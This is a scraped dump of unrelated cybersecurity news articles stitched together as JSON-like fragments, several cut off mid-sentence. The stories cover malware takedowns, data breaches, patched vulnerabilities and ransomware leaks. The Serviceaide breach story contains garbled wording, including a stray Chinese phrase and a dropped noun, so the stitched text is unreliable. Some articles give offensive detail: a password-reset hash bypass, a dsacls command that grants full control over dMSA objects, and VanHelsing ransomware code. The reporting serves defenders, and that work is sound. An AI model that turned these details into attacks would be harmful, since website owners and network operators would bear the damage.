major changes using the labels “version 1” through “version 6”.”\n\nThe FBI and US CISA also released a joint advisory that includes tactics, techniques, and procedures (TTPs) associated with Lumma Stealer along with indicators of compromise (IOCs).\n\n“Malware like LummaC2 is deployed to steal sensitive information such as user login credentials from millions of victims in order to facilitate a host of crimes, including fraudulent bank transfers and cryptocurrency theft,” said Matthew R. Galeotti, head of the Justice Department’s Criminal Division. “Today’s announcement demonstrates that the Justice Department is resolved to use court-ordered disruptions like this one to protect the public from the theft of their personal information and their assets. The Department is also committed to working with and appreciates the efforts of the private sector to safeguard the public from cybercrime.”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nCybercrime\nHacking\nhacking news\ninformation security news\nIT Information Security\nLumma Stealer\nMaaS\nmalware\nPierluigi Paganini\nSecurity Affairs\nSecurity News",

        "content": "NEW SIGNAL UPDATE STOPS WINDOWS FROM CAPTURING USER CHATS\nPierluigi Paganini\n \nMay 22, 2025\nSignal implements new screen security on Windows 11, blocking screenshots by default to protect user privacy from Microsoft’s Recall feature.\n\nA Signal update for the Windows app prevents the system from capturing screenshots by default. The feature protects users’ privacy from Microsoft’s Recall feature.\n\n“Signal Desktop now includes support for a new “Screen security” setting that is designed to help prevent your own computer from capturing screenshots of your Signal chats on Windows. This setting is automatically enabled by default in Signal Desktop on Windows 11.” reads the announcement published by Signal. “If you’re wondering why we’re only implementing this on Windows right now, it’s because the purpose of this setting is to protect your Signal messages from Microsoft Recall.”\n\nThe feature announced by Microsoft” Copilot+ PCs in 2024 captures screenshots of the user’s laptop every few seconds.\n\n“You can use Recall on Copilot+ PCs to find the content you have viewed on your device. Recall is currently in preview status; during this phase, we will collect customer feedback, develop more controls for enterprise customers to manage and govern Recall data, and improve the overall experience for users.” reads the announcement.\n\nMicrosoft explained that the Recall feature will store encrypted snapshots locally on the user’s computer, the feature will be only implemented in forthcoming Copilot+ PCs. Microsoft doesn’t have access to the snapshot.\n\nPrivacy advocates expressed their concerns about the potential abuses of the feature.\n\nThe IT giant attempted to downplay the risks for the users, it pointed out that the feature was developed with privacy and security by design and it is an “optional experience.”\n\nMicrosoft added that Recall does not take snapshots of certain kinds of content, such as InPrivate web browsing sessions in Microsoft Edge.\n\nUsers can manage which snapshots Recall collects, excluding specific apps or websites. They can also pause snapshot collection, clear some or all stored snapshots, or delete all snapshots from their device.\n\nThe company suspended the rollout of the features following the public concerns, but recently started testing it again.\n\n“Although Microsoft made several adjustments over the past twelve months in response to critical feedback, the revamped version of Recall still places any content that’s displayed within privacy-preserving apps like Signal at risk.” continues Signal. “As a result, we are enabling an extra layer of protection by default on Windows 11 in order to help maintain the security of Signal Desktop on that platform even though it introduces some usability trade-offs. Microsoft has simply given us no other option.”\n\nSignal’s new screen security blocks screenshots, showing only a blank screen. Unfortunately, it may affect some accessibility software, including screen readers or magnification tools for people who are visually impaired. Users can disable it via settings, with a warning and confirmation to avoid accidental deactivation.\n\nSignal said that when you are trying to take a screenshot with the new screen security setting enabled, you will just get a blank screen.\n\nSignal’s screen security on Windows 11 is easy to disable, but the developers say it is hard to turn off accidentally, requiring a warning and confirmation. The setting only applies locally and doesn’t affect screenshots or accessibility tools on other devices like macOS or Linux.\n\n“We hope that the AI teams building systems like Recall will think through these implications more carefully in the future. Apps like Signal shouldn’t have to implement “one weird trick” in order to maintain the privacy and integrity of their services without proper developer tools. People who care about privacy shouldn’t be forced to sacrifice accessibility upon the altar of AI aspirations either.” concludes the announcement.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, privacy)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nHacking\nhacking news\ninformation security news\nIT Information Security\nPierluigi Paganini\nprivacy\nSecurity Affairs\nSecurity News\nSignal",

The malware spreads via malspam campaigns, it inserts replies in active email threads.\n\nGallyamov began developing Qakbot in 2008, building a team that expanded its capabilities over the time. Used for over a decade, it served as a trojan, dropper, and backdoor.\n\nSince 2019, Qakbot has served as an attack vector in ransomware operations by major gangs like Conti, REvil, Black Basta, Egregor, and others.\n\nThe U.S. Justice Department filed a civil forfeiture complaint to seize over $24M in crypto from Gallyamov, part of a multinational cybercrime crackdown.\n\n“A federal indictment unsealed today charges Rustam Rafailevich Gallyamov, 48, of Moscow, Russia, with leading a group of cyber criminals who developed and deployed the Qakbot malware. In connection with the charges, the Justice Department filed today a civil forfeiture complaint against over $24 million in cryptocurrency seized from Gallyamov over the course of the investigation.” reads the press release published by DoJ. “These actions are the latest step in an ongoing multinational effort by the United States, France, Germany, the Netherlands, Denmark, the United Kingdom, and Canada to combat cybercrime.”\n\nThe DOJ’s latest charges build on the 2023 Operation ‘Duck Hunt’ that dismantled the Qakbot botnet, revealing Gallyamov and his team continued attacks using “spam bombs” and ransomware like Black Basta and Cactus into 2025. Over 170 BTC and millions in crypto were previously seized.\n\nIn November 2022, experts at the Cybereason Global SOC (GSOC) team observed a surge in Qakbot infections as part of an ongoing aggressive Qakbot malware campaign that led to Black Basta ransomware infections in the US.\n\nAccording to the FBI’s 2023 announcement, crimes associated with Qakbot attacks caused hundreds of millions of dollars in losses to individuals and businesses in the U.S. and abroad. \n\nThe FBI explained that as part of the operation has gained lawful access to Qakbot’s C2 infrastructure and identified over 700,000 infected computers worldwide. More than 200,000 infected computers were in the U.S.\n\n“Investigators have found evidence that, between October 2021 and April 2023, Qakbot administrators received fees corresponding to approximately $58 million in ransoms paid by victims,” states the Justice Department.\n\nThe FBI performed a sinkholing of the botnet and once replaced the C2 infrastructure instructed the bot to download an uninstaller file and execute it to remove the Qakbot malware.\n\nDespite the Qakbot takedown, Gallyamov continued attacks through January 2025. The DOJ has now filed to forfeit over $24 million in seized cryptocurrency.\n\n“On April 25, 2025, pursuant to a seizure warrant, the FBI seized additional illicit proceeds from Gallyamov, including over 30 bitcoin and over $700,000 of USDT tokens. Today, the Department filed a civil forfeiture complaint in the Central District of California against all of the illicit proceeds seized from Gallyamov — worth over $24 million as of today — in order to forfeit and ultimately return those funds to victims.” continues DoJ.\n\nThe actions are part of Operation Endgame, a global law enforcement effort targeting cybercriminal groups.

This marks a shift from Japan’s pacifist stance under Article 9, aiming to elevate its cyber defense to match major Western powers and enable broader military support to allies.\n\nThe law allows government agencies to carry out hacking back operations, infiltrating and neutralizing infrastructure employed by threat actors to target the country and its organizations.\n\nJapan’s new Active Cyberdefense Law also lets authorities preemptively target hostile infrastructure, even before attacks occur. It also enables Self-Defence Forces to aid allies and handle advanced cyber threats, reflecting a shift in the interpretation of Article 9 for national and allied security.\n\nThe Japanese government aims to make the new legal framework fully operational by 2027.\n\n“The new law is intended to enable Japan to “identify and respond to cyber attacks more quickly and effectively” according to Yoshimasa Hayashi, Japan’s chief cabinet secretary, who added on Friday that it would help Tokyo “equal or exceed” the cyber capabilities “of major European countries and the US.”” reported The Record Media.\n\nThe Japanese government will monitor and analyze IP addresses involved in international communications passing through or to/from Japan. Domestic communications and message content, such as email bodies, are excluded from surveillance.\n\n“A new independent panel will be set up to give prior approval for data acquisition and analysis, as well as for actions to neutralize hostile servers. It will also be tasked with ensuring that government surveillance is being properly conducted.” reported by Kyodo News. “In response to concerns from opposition parties over potential government overreach and violation of the constitutional right to secrecy of communications, the government revised legislation and stipulated specific provisions in the law to uphold personal rights.”\n\nJapan remains a target for both financially motivated threat actors and APT groups.\n\nIn April 2025, Japan ’s Financial Services Agency (FSA) warned of hundreds of millions in unauthorized trades linked to hacked brokerage accounts.\n\nIn March 2025, a data breach suffered by the Japanese telecom giant NTT exposed information of nearly 18,000 corporate customers.\n\nIn December, a cyberattack hit Japan Airlines (JAL), causing the suspension of ticket sales for flights departing on Thursday.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, Japan)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nHacking\nhacking news\ninformation security news\nIT Information Security\nJapan\nPierluigi Paganini\nSecurity Affairs\nSecurity News",

        "content": "Data breach at Serviceaide, Inc., a technology vendor for Catholic Health, exposed sensitive information belonging to approximately 480,000 patients.\n\nThe incident, caused by an improperly secured Elasticsearch database, left names, Social Security numbers, medical records, and login credentials publicly accessible for nearly seven weeks.\n\nWhile forensic analysts found no direct evidence of data misuse, the scale of the exposure raises significant concerns about systemic vulnerabilities in third-party healthcare IT systems.\n\n- Advertisement -\n\nThe breach originated from a misconfigured Catholic Health Elasticsearch database managed by Serviceaide, which inadvertently became publicly accessible on September 19, 2024.\n\nUnauthorized parties could theoretically access patient records until November 5, when Serviceaide discovered the vulnerability during a routine audit and restricted access.\n\nThe delayed detection—47 days—allowed potential attackers ample time to exploit the data, though Serviceaide’s investigation found no conclusive proof of data exfiltration.\n\nServiceaide engaged a third-party forensic firm to analyze the database’s activity logs, but the absence of comprehensive monitoring tools limited their ability to track access attempts.\n\nCatholic Health has not disclosed whether the database required authentication prior to the incident or if encryption protocols were active.\n\nIn response, Serviceaide claims to have implemented “additional security measures,” though specifics remain vague. The U.S. Department of Health and Human Services (HHS) is reviewing the breach under HIPAA’s third-party vendor compliance guidelines.\n\nScope of Compromised Patient Information\n\nThe exposed data represents a mosaic of highly sensitive identifiers: 92% of affected individuals had Social Security numbers exposed, while 100% lost medical record numbers, treatment histories, and provider details.\n\nA subset of 31,000 patients also had email credentials compromised, including hashed passwords—a critical risk given frequent password reuse across platforms.\n\nNotably, the database contained psychiatric treatment notes and prescription records, which are protected under stricter regulations like 42 CFR Part 2.\n\nLegal experts suggest this could trigger separate penalties beyond standard HIPAA violations.\n\nThe data’s structured format in Elasticsearch—a tool designed for rapid search operations—means attackers could efficiently query and export records if they breached the system.\n\nCatholic Health has faced scrutiny for not proactively auditing Serviceaide’s security practices, despite a 2023 HHS warning about rising third-party vulnerabilities in healthcare.\n\nServiceaide, which provides IT infrastructure to 17 hospital networks nationwide, has not commented on whether other clients were impacted.\n\nMitigation Measures and Consumer Protections\n\nServiceaide is offering 24 months of credit monitoring via Experian IdentityWorks, but critics argue this fails to address medical identity theft risks. Patients are advised to:\n\nReview Explanation of Benefits (EOB) statements for unrecognized services, which often precede insurance fraud.\nPlace enhanced fraud alerts with credit bureaus using language specifying medical identity theft concerns.\nRequest manual audits of their medical records through Catholic Health’s privacy office to detect tampering.\n\nThe breach underscores systemic gaps in healthcare vendor风险管理.\n\nProposed solutions include mandatory real-time monitoring for all third-party databases and revised HIPAA rules requiring hospitals to validate vendors’ security configurations biannually.\n\nUntil such reforms materialize, patients remain vulnerable to collateral damage from insecure partner systems.\n\nServiceaide’s dedicated operates weekday business hours, though users report extended wait times.\n\nWith healthcare breaches up 72% year-over-year, this incident reinforces the urgent need for enforceable cybersecurity standards across the medical supply chain.\n\nFind this News Interesting!

        "content": "Critical security vulnerability has been discovered in Motors, a popular WordPress theme with over 22,000 sales, potentially exposing thousands of websites to complete takeover.\n\nSecurity researchers at Wordfence identified an unauthenticated privilege escalation vulnerability that allows attackers to change passwords of any user, including administrators, without requiring prior authentication.\n\nThe vulnerability, identified as CVE-2025-4322 with a critical CVSS rating of 9.8, was discovered by security researcher Foxyyy through Wordfence’s Bug Bounty Program and has since been patched in version 5.6.68.\n\n- Advertisement -\n\nThe security flaw in Motors theme versions 5.6.67 and earlier enables unauthenticated attackers to reset passwords for any user account on affected websites.\n\nThis privilege escalation vulnerability is particularly dangerous as it requires no authentication and can target administrator accounts, giving attackers complete control over compromised websites.\n\nOnce administrative access is gained, attackers can upload malicious files, inject malware, redirect users to phishing sites, or modify website content.\n\n“This vulnerability makes it possible for unauthenticated threat actors to easily take over websites by resetting the password of any user, including administrators,” Wordfence explained in their report.\n\nThe researcher who discovered this critical flaw received a $1,073 bounty, which included a 10% bonus for providing a comprehensive, easily reproducible proof-of-concept.\n\nTechnical Breakdown of the Exploit\n\nThe vulnerability stems from improper validation in the password recovery function within the Motors theme.\n\nSpecifically, the password-recovery.php template fails to properly validate a user’s identity before processing password updates.\n\nWhile the code does include a hash comparison mechanism intended to verify legitimate password reset requests, researchers discovered a critical bypass.\n\nThe vulnerability exploits two key weaknesses in the theme’s code: first, the system fails to validate whether a password reset was actually requested, and second, attackers can bypass the hash check by supplying an invalid UTF-8 character in the hash_check parameter.\n\nThis character gets stripped by the esc_attr() function after the initial !empty() check but before the comparison, effectively allowing password changes without a valid hash.\n\nThe technical flaw is particularly dangerous because most users don’t have active password reset requests, making the majority of Motors-powered vulnerable to this attack vector.\n\nPatch Deployment and Protection Measures\n\nStylemixThemes, the developer of Motors, released a patched version on May 14, 2025, after being notified of the vulnerability on May 5.\n\nThe fix is available in version 5.6.68, and all site owners using the Motors theme are strongly urged to update immediately.\n\nWordfence has implemented protective measures for users of its security services.\n\nPremium, Care, and Response subscribers received firewall protection against this exploit on May 6, while free Wordfence users will receive the same protection on June 5, 2025.\n\n“We would like to commend the StylemixThemes team for their prompt response and timely patch,” noted Wordfence in their disclosure timeline.\n\nSite owners are advised to verify their theme version and update promptly given the critical nature of this vulnerability.\n\nSecurity experts also recommend implementing additional security layers including strong passwords, two-factor authentication, and regular security audits to protect WordPress installations from similar threats.\n\nFind this News Interesting!

        "content": "Cybersecurity and Infrastructure Security Agency (CISA) has added a cross-site scripting (XSS) vulnerability affecting MDaemon Email Server to its Known Exploited Vulnerabilities (KEV) Catalog on May 19, 2025.\n\nThis critical addition, identified as CVE-2024-11182, highlights a security flaw that allows attackers to inject malicious JavaScript code via crafted HTML emails.\n\nFederal agencies now have until June 9, 2025, to implement necessary remediation measures, while all organizations are strongly encouraged to address this vulnerability promptly to prevent potential security breaches.\n\n- Advertisement -\n\nThe vulnerability affects MDaemon Email Server versions prior to 24.5.1c and enables attackers to embed JavaScript code in HTML email messages, specifically within image tags.\n\nWhen a recipient views the malicious email in the webmail interface, the arbitrary JavaScript code executes within the context of the user’s browser window, potentially giving attackers access to sensitive browser data and functionality.\n\nThis vulnerability has already been weaponized in the wild, with evidence suggesting exploitation by Russian state-sponsored threat actors.\n\nSecurity researchers have linked the APT28 group to leveraging this vulnerability in their “Operation Round Press” cyber-espionage campaigns.\n\nThe presence of this exploit in active campaigns significantly elevates its risk profile, despite its medium CVSS score of 6.1.\n\n“Cross-site scripting vulnerabilities remain particularly dangerous because they can bypass client-side security controls and execute in the context of a trusted application,” explains the CISA advisory, which classifies this under the CWE-79 category (Improper Neutralization of Input During Web Page Generation).\n\nImpact on Federal Agencies\n\nUnder Binding Operational Directive (BOD) 22-01, all Federal Civilian Executive Branch (FCEB) agencies must remediate this vulnerability by June 9, 2025—21 days after its addition to the KEV Catalog.\n\nThis directive establishes a compulsory timeline for federal agencies to address known exploited vulnerabilities, emphasizing CISA’s risk-based approach to vulnerability management.\n\nThe KEV Catalog has emerged as a crucial resource for prioritizing remediation efforts, focusing on vulnerabilities that pose immediate threats rather than theoretical risks.\n\nUnlike traditional vulnerability scoring systems that may overemphasize potential impacts, the KEV specifically highlights vulnerabilities with confirmed exploitation in the wild.\n\n“The KEV catalog sends a clear message to all organizations to prioritize remediation efforts on the subset of vulnerabilities that are causing immediate harm based on adversary activity,” states CISA’s official guidance.\n\nRecommended Actions for Organizations\n\nOrganizations using MDaemon Email Server should immediately update to version 24.5.1c or later to mitigate this vulnerability.\n\nFor entities unable to update promptly, implementing compensating controls such as web application firewalls or email filtering systems configured to block emails containing suspicious JavaScript code is recommended.\n\nSecurity experts emphasize that this vulnerability should be addressed with urgency due to its active exploitation status.\n\n“The ‘In The Wild’ tag associated with this CVE indicates that it is actively being exploited by hackers. This signals an immediate need to implement mitigating measures,” notes one security advisory.\n\nCISA strongly recommends incorporating the KEV Catalog into broader vulnerability management frameworks, such as the Stakeholder-Specific Vulnerability Categorization (SSVC), to appropriately triage vulnerabilities based on real-world exploitation risk rather than severity scores alone.\n\nOrganizations can access the KEV Catalog through CISA’s website in multiple formats including CSV and JSON, and subscribe to updates to stay informed about newly added vulnerabilities.\n\nFind this News Interesting!

By executing dsacls \"CN=Managed Service Accounts,DC=kingdom,DC=local\" /G \"KINGDOM\\poc:GA\" /T /I:S, attackers force permission inheritance down to child objects.\n\nThis grants the attacker full visibility and control over all dMSA objects within the container, including the ability to take ownership of objects typically restricted to Domain Admins.\n\nSettings for dMSA-POC\n\nPersistence is achieved by creating additional dMSAs under the attacker’s control or by adding unauthorized entities to the PrincipalAllowedToRetrieveManagedPassword attribute, effectively maintaining backdoor access to the environment even if the initial compromise is discovered.\n\nDetection and Defense Strategies\n\nOrganizations implementing Windows Server 2025 must apply specific mitigations to protect against dMSA abuse.\n\nFor Windows 11 24H2 and Windows Server 2025 clients, administrators should activate the Group Policy setting under Computer Configuration\\Administrative Templates\\System\\Kerberos\\Enable Delegated Managed Service Account logons.\n\nDelegated Managed Service Account\n\nAccording to the Report, Security teams should establish monitoring for events relating to access to dMSA objects with write permissions, as these can indicate potential abuse.\n\nAdditionally, organizations should implement strict permission controls on the Managed Service Accounts container, regularly audit permission changes, and follow least-privilege principles for all administrative accounts.\n\nMicrosoft continues to enhance service account security with each iteration, but this discovery demonstrates that even advanced security features can be subverted when attackers gain specific elevated permissions in Active Directory environments.\n\nFind this News Interesting!

[code for processing file data]\n    $args = [\n        // ... other user details,\n        'role' => ! empty( $row['role'] ) ? $row['role'] : '',\n    ];\n    $speaker->create($args);\n}\n\nThe Patch\n\nAccording to the Report, Version 4.0.27 of the Eventin plugin addresses this vulnerability by adding a robust permission check within the import_item_permissions_check() function and implementing a whitelist for permissible roles during user import:\n\nphppublic function import_item_permissions_check( $request ) {\n    if (!current_user_can('manage_options')) {\n        return new WP_Error('rest_forbidden', __('You do not have permission to import users.', 'eventin'), ['status' => 403]);\n    }\n    return true;\n}\n\nPatch\n\nThis vulnerability underscores the critical nature of proper permission handling in software development.\n\nFor site administrators using Eventin, immediate action to update to version 4.0.27 or higher is recommended to safeguard their installations.\n\nFor developers, this incident serves as a reminder of the importance of not just implementing but also verifying the effectiveness of security measures to prevent such exploitable oversights.\n\nPatchstack, the security firm that facilitated the bug bounty, has ensured that their customers are already protected against this vulnerability through their Enterprise API and security audit services, emphasizing the role of proactive security measures in web development.\n\nFind this News Interesting!

        "content": "Mozilla has urgently patched two critical 0-day vulnerabilities in its popular web browser Firefox, both of which could allow remote attackers to execute malicious code on user systems.\n\nThe flaws, tracked as CVE-2025-4918 and CVE-2025-4919, were disclosed on May 17, 2025, and are addressed in Firefox version 138.0.4. Security experts are strongly advising all users to update immediately, as active exploitation in the wild is likely.\n\nThe first vulnerability, CVE-2025-4918, was reported by Edouard Bochin and Tao Yan of Palo Alto Networks, working in collaboration with Trend Micro’s Zero Day Initiative.\n\n- Advertisement -\n\nThis flaw revolves around an out-of-bounds access condition that arises when Firefox’s JavaScript engine resolves Promise objects.\n\nJavaScript Promises are widely used for handling asynchronous operations in modern web applications, and improper management of their memory boundaries can open the door for attackers.\n\nBy exploiting this flaw, a remote attacker could perform an out-of-bounds read or write operation, potentially leading to data leakage, browser crashes, or even the execution of arbitrary code under the context of the browser.\n\nThe underlying technical issue involves the incorrect handling of memory when Promise objects are resolved, allowing crafted JavaScript to manipulate the browser’s internal memory space.\n\nSuch vulnerabilities are particularly dangerous as they can often be triggered simply by visiting a malicious web page.\n\nThis means attackers do not require any additional user interaction, vastly increasing the risk profile and urgency of the fix.\n\nArray Index Confusion\n\nThe second 0-day flaw, tracked as CVE-2025-4919, was discovered by security researcher Manfred Paul, also working with Trend Micro’s Zero Day Initiative.\n\nThis vulnerability is rooted in the Firefox JavaScript engine’s optimization routines, specifically when handling linear sums in array operations.\n\nImproper validation during the optimization process can allow an attacker to confuse array index sizes, again permitting out-of-bounds read or write conditions.\n\nAn attacker exploiting CVE-2025-4919 could craft malicious JavaScript that manipulates array sizes and indices in such a way that the browser reads from or writes to unexpected areas of memory.\n\nThis kind of memory corruption is a common technique for bypassing security controls and ultimately achieving remote code execution.\n\nThe revelation that both vulnerabilities impact core aspects of the JavaScript engine-central to all modern web functionality-means the potential impact is extremely broad.\n\nUpdates to Prevent Exploitation\n\nBoth vulnerabilities have been rated “critical” by Mozilla, reflecting the highest severity due to the possibility of arbitrary code execution and the likelihood of exploitation in real-world attacks.\n\nThey have been publicly disclosed under Mozilla’s security advisory process, with Firefox 138.0.4 serving as the first version that addresses both flaws.\n\nMozilla has credited the discoverers and the Zero Day Initiative for their responsible disclosure, allowing for the vulnerabilities to be patched before widespread exploitation.\n\nAccording to the Report, Security researchers and organizations are sounding the alarm: users should install the latest Firefox update immediately, as attackers are known to rapidly incorporate fresh browser exploits into malicious campaigns.\n\nFor those unable to update right away, it is strongly recommended to avoid visiting unfamiliar websites and to temporarily disable JavaScript execution through browser settings or security extensions.\n\nRegularly updating browsers and other software remains one of the most effective defenses against these rapidly evolving threats.\n\nFind this News Interesting!

        "content": "The cybersecurity landscape reveal that the VanHelsing ransomware operation has experienced a significant security breach with its source code being leaked publicly.\n\nAccording to security researchers, this leak occurred after an internal dispute with a former developer who attempted to monetize the code before it was released freely by the ransomware operators.\n\nThe leaked materials include critical components of the ransomware infrastructure, though some elements remain missing, potentially limiting immediate exploitation by opportunistic threat actors.\n\n- Advertisement -\n\nThe controversy began when a developer identifying as ‘th30c0der’ attempted to auction the VanHelsing ransomware source code on the RAMP cybercrime forum.\n\nSource code\n\nThe auction reportedly started at $10,000, suggesting the developer was seeking to profit from their previous work with the ransomware operation.\n\nHowever, this monetization attempt was quickly undermined when the VanHelsing operators themselves released the code publicly, claiming they were preempting what they described as the developer’s “scam.”\n\nThe timing of these events indicates an internal conflict within the ransomware group, with the original operators stating they are already working on a new version dubbed “VanHelsing 2.0.”\n\nThis pattern of internal disputes leading to code leaks has been observed in other ransomware operations and often signals a significant disruption to the group’s operational security.\n\nTechnical Analysis of the Leaked Source Code\n\nSecurity researchers examining the leaked materials have confirmed their authenticity while noting several technical aspects of interest.\n\nThe leak encompasses the Windows encryptor builder, the affiliate panel used to manage ransomware campaigns, and the data leak blog infrastructure used to pressure victims into paying ransoms.\n\nNotably absent from the leak are the Linux builder component and the operation’s databases, which limits the immediate utility of the code for potential copycats.\n\nAnalysis of the source code reveals functionality intended to prevent multiple infections of the same system:\n\ntextif (isForce == FALSE)\nHANDLE hMutex = CreateMutexA(nullptr, TRUE, \"Global\\\\VanHelsingLocker\"); \nif (GetLastError() == ERROR_ALREADY_EXISTS)\n{\n    return EXIT_FAILURE;\n}\n\n\nThis mutex implementation prevents the ransomware from executing twice on the same system. The code also shows evidence of lateral movement capabilities through SMB protocols:\n\ntextCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) MonitorAndKill, NULL, 0, NULL);\nif (isSpreadSmb == TRUE)\n{\n    net* _net = new net();\n    WCHAR temp_path[500];\n    WCHAR psexec_path[1500];\n    GetTempPathW(500,temp_path);\n    swprintf_s(psexec_path, L\"%s\\\\psexec.exe\", temp_path);\n}\n\n\nResearchers have also discovered that the group was developing an MBR (Master Boot Record) locker, designed to replace the system’s boot record with a lock screen message, rendering infected systems completely unusable until payment.\n\nImplications for the Cybersecurity Landscape\n\nThis source code leak follows a concerned pattern seen previously with other ransomware operations including Babuk, Conti, and LockBit.\n\nHistorically, such leaks have enabled new threat actors to launch derivative attacks with minimal technical expertise required.\n\nAlthough the VanHelsing leak is incomplete and would require modifications to be fully operational, it nonetheless provides malicious actors with a foundation they can build upon.\n\nThe cybersecurity community is now monitoring for potential new variants based on the leaked code.\n\nThe VanHelsing operators’ announcement of a forthcoming “VanHelsing 2.0” version suggests they plan to continue operations despite this setback, potentially with improved security measures to prevent future leaks.\n\nFor organizations and cybersecurity professionals, this development underscores the importance of maintaining robust security postures and staying informed about emerging threats that may leverage components of the leaked ransomware builder.\n\nFind this News Interesting!

Lane, age 19, has agreed to plead guilty to federal charges encompassing cyber extortion, unauthorized access to protected computers, and aggravated identity theft.\n\nThe high-profile case has sent shockwaves through the education and technology sectors, underlining the growing risks of cybercrime in systems entrusted with sensitive information.\n\n- Advertisement -\n\nFederal prosecutors allege that from April to May 2024, Lane conspired with others to hack into the computer networks of two prominent U.S. companies, including PowerSchool.\n\nUsing stolen login credentials, Lane gained unauthorized access to a cloud storage provider serving school systems across the United States and Canada.\n\nHe allegedly transferred a trove of personally identifiable information (PII) — including names, social security numbers, dates of birth, medical details, and even parent and guardian data — to a server he controlled in Ukraine.\n\nThe scope of the breach was staggering, with Lane threatening to publish the confidential records of over 60 million students and 10 million teachers unless he received a ransom payment in Bitcoin amounting to nearly $2.85 million.\n\nIn separate extortion attempts, Lane and his associates similarly targeted a telecommunications provider, demanding a ransom of $200,000, and issued explicit threats to escalate the exposure of internal records if their demands were not met.\n\nProsecutors described Lane’s communications as coercive, quoting a message in which he warned, “We are the only ones with a copy of this data now. Stop this nonsense… Make the correct decision and pay the ransom.”\n\nLaw and Sentencing Guidelines\n\nThe charges brought against Lane — including cyber extortion conspiracy, cyber extortion, unauthorized access to protected computers, and aggravated identity theft — each carry significant legal consequences.\n\nEach computer fraud-related charge could result in up to five years in prison, supervised release, and substantial financial penalties, while the aggravated identity theft charge mandates a consecutive two-year prison term.\n\nSentencing will ultimately be determined by federal guidelines and rests with the presiding district judge.\n\nUnited States Attorney Leah B. Foley emphasized the wider impact of such cybercrimes, noting that these attacks impose real financial costs, violate the trust of affected families, and “instill fear in parents that their kids’ information had been leaked into the hands of criminals.”\n\nThe FBI, which led the investigation, reiterated its commitment to pursuing cyber offenders, regardless of age or motivation, signaling the government’s resolve in confronting digital threats against critical infrastructure and private data.\n\nCommunity Response and Investigation\n\nThe PowerSchool breach has raised urgent questions for students, educators, and families whose information may have been compromised.\n\nAccording to the Report, School districts are advising those concerned about potential exposure of personal data to contact their local administrators for guidance.\n\nAs the case moves toward a plea hearing, authorities are working to support the victims and enhance cybersecurity measures across educational platforms.\n\nLane remains presumed innocent until the court formally accepts his guilty plea and imposes sentence.\n\nThe ongoing investigation, assisted by the Assumption University Police Department and prosecuted by the Securities, Financial & Cyber Fraud Unit, reflects intensified scrutiny of cyberthreats targeting youth data and the imperative of fortified digital defenses within the education sector.\n\nFind this News Interesting!

notable examples include invitations to military events or official economic briefings, tailored for Sri Lanka’s Army 55 Division and the Central Bank of Sri Lanka’s IT directorate.\n\nWhile the campaign references a broad range of high-value institutions, confirmed victimology is currently limited to the Sri Lankan and Bangladeshi military and financial sectors, indicating a combination of direct targeting and credibility-boosting impersonation in SideWinder’s phishing emails.\n\nThe attackers maintain operational security by generating unique payloads per target, using server-side polymorphism to frustrate signature-based detection and automatic sample correlation.\n\nOrganizations in South Asia particularly those in government, military, or critical infrastructure are urged to enforce immediate patching of legacy Office vulnerabilities, especially CVE-2017-0199 and CVE-2017-11882.\n\nDisabling macros and external template loading, restricting the use of mshta.exe, wscript.exe, and powershell.exe, and deploying behavioral detection tools that flag anomalous child processes or memory injection are critical steps.\n\nNetwork-level filtering against known malicious domains and user education to recognize spear-phishing hallmarks are also essential to reduce risk.\n\nThis campaign reinforces how resilience against well-known exploits demands not just advanced detection, but also relentless attention to basic security hygiene.\n\nSideWinder’s evolving tactics combining geofenced distribution, shellcode loaders, DLL sideloading, and rapid infrastructure churn demonstrate the persistent threat posed by APTs leveraging “forgotten” vulnerabilities.\n\nIndicators of Compromise (IOCs)\nType\tIndicator\tDescription\nSHA256 Doc\t57b9744b30903c7741e9966882815e1467be1115cbd6798ad4bfb3d334d3523d\tMalicious DOC, “Caution Against Propaganda…”\nSHA256 RTF\te4afb43a13e043d99ff0fb0a0ac49e96a04932ba37365527914d6be779597edf\tExploit RTF, CVE-2017-11882\nSHA256 Payload\t61132f15775224f8aae02499b90b6bc19d4b3b44d987e0323276dceb260cc407\tStage 3, StealerBot DLL\nSHA256 DLL\tc62e365a6a60e0db4c2afd497464accdb783c336b116a5bc7806a4c47b539cc5\tFinal unencrypted StealerBot sample\nDomain\tadvisory[.]army-govbd[.]info\tC2 Infrastructure\nDomain\tupdates-installer[.]store\tC2 Infrastructure\nDomain\tdwnlld[.]com\tC2 Infrastructure\nDomain\tbismi[.]pro\tC2 Infrastructure\nC2 Panel URL\thxxps://ecility[.]xyz\tStealerBot control panel\nFile\tTapiUnattend.exe (MD5: b574abf43dcc57a359129d1adb4cdda0)\tLegitimate used for DLL sideloading\nFile\twdscore.dll (MD5: b37522b69406b3f6229b7f3bbef0a293)\tMalicious DLL loader\n\nFind this News Interesting!

        "content": "A massive data leak from the LockBit ransomware group, published on its hijacked leak site, has provided an unprecedented glimpse into the inner workings of one of the most notorious Ransomware-as-a-Service (RaaS) operations.\n\nThe leaked data, spanning from December 19, 2024, to April 29, 2025, primarily pertains to the group’s “LockBit Lite” panel a lower-tier affiliate program designed for novice threat actors.\n\nUnlike the standard LockBit affiliate scheme, which demands a 1 BTC deposit and rigorous vetting based on reputation, team composition, and prior cybercrime experience, LockBit Lite offers access to ransomware for a mere $777 USD fee.\n\n- Advertisement -\n\nThis accessible entry point, introduced in December 2024, allows affiliates to launch attacks within minutes of payment, though with significant trade-offs such as lack of direct access to encryption keys.\n\nAffiliates often rely on a “boss” or “tech support” for decryptors, leading to delays and, in several cases, failed decryption even after ransom payments.\n\nProlific Affiliates\n\nAnalysis of the leaked data highlights the most active affiliates on the LockBit Lite panel, with “Christopher” leading at 44 negotiations, followed by “jhon0722” with 42, and others like “PiotrBond,” “JamesCraig,” and “Swan” trailing behind.\n\nAn intriguing figure, “matrix777,” appears to be a senior member or administrator due to matching TOX IDs and a registration date of November 15, 2020, far predating the Lite panel’s inception.\n\nVictimology reveals a notable focus on Chinese organizations, potentially due to perceived ease of compromise and higher likelihood of ransom payment, as one affiliate noted, “We love working with China, they pay well.”\n\nSurprisingly, Russian targets were also 